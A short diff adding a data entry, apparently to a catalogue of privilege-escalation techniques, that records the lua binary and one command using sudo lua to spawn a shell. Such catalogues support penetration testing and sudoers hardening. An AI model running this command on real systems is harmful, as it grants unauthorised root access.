@@ -1,0 +1,4 @@
+name: lua
+binary_path: /usr/bin/lua
+exploit_cmds:
+- sudo /usr/bin/lua -e 'os.execute("/bin/sh")'
